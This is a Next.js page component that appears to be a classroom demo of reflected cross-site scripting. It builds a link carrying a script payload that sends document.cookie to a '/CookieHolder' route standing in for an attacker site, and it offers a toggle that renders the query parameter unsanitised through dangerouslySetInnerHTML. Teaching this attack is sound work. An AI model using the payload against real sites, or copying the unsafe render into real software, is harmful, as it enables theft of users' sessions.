import Link from "next/link";
import { redirect } from 'next/navigation';
import { cookies, headers } from "next/headers";

let XSSEnabled = "disabled";
let SDEEnabled = "disabled";

export default async function Home({
  searchParams,
}: {
  searchParams: Promise<{ [key: string]: string | string[] | undefined }>
}) {
    const coolText = (await searchParams).coolText
    const hostname = (await headers()).get("host")
    const evilLink = `http://${hostname}/?coolText=<script>document.location='http://${hostname}/CookieHolder?'%2Bdocument.cookie</script>`;
    let XSSEnabled = (await cookies()).get("XSSEnabled")?.value
    let SDEEnabled = (await cookies()).get("SDEEnabled")?.value
    const myCookie = (await cookies()).get("cookie")?.value

    async function handleFormAction(formData: FormData) {
    "use server"
    const action = formData.get("action");
    const cookieStore = await cookies()

    if (action === "toggleXSS") {
        let curr = cookieStore.get("XSSEnabled")?.value;
        cookieStore.set({name: "XSSEnabled", value: curr == "enabled" ? "disabled" : "enabled"});
    }

    if (action === "toggleSDE") {
        let curr = cookieStore.get("SDEEnabled")?.value;
        cookieStore.set({name: "SDEEnabled", value: curr == "enabled" ? "disabled" : "enabled"});
    }

    if (action === "generateCookie") {
        const cookie = Math.floor(Math.random() * 1000).toString();

        cookieStore.set({name: "cookie", value: cookie});
    }

    redirect("/");
}

    return (
        <div className="font-sans grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
            <main className="flex flex-col gap-[8px] row-start-2 items-center sm:items-start">
                <h1>Reflected cross-site scripting attack</h1>
                <p>There is a page on the route /CookieHolder that represents a malicious website.
                    Clicking the link below sends your cookie to the malicious webpage. Your friend sent you this link unprompted. Try clicking it:
                </p>
                <a href={evilLink}>{evilLink}</a>
                <form action={handleFormAction}>
                <input type="hidden" name="action" value="toggleXSS" />
                    <label>
                        XSS - {XSSEnabled == "enabled" ? "Enabled" : "Disabled"}
                    </label>
                    <button type="submit" className="ml-2 px-2 py-1 border rounded">Toggle</button>
                </form>
                <h1>Here goes the cool text!</h1>
                {coolText}
                {XSSEnabled == "enabled" && <div dangerouslySetInnerHTML={{ __html: coolText ?? ''}}></div>}

                <form action={handleFormAction}>
                
                <p>Your cookie is: {myCookie ?? ""}</p>
                <input type="hidden" name="action" value="generateCookie" />
                    <button type="submit" className="ml-2 px-2 py-1 border rounded">Generate Cookie</button>
                </form>
                
                <hr></hr>

                <form action={handleFormAction}>
                <input type="hidden" name="action" value="toggleSDE" />
                    <label>
                        SDE - {SDEEnabled == "enabled" ? "Enabled" : "Disabled"}
                    </label>
                    <button type="submit" className="ml-2 px-2 py-1 border rounded">Toggle</button>
                </form>

                <Link href="/Passwords">I forgot my password!</Link>
                
            </main>
        </div>
    );
}
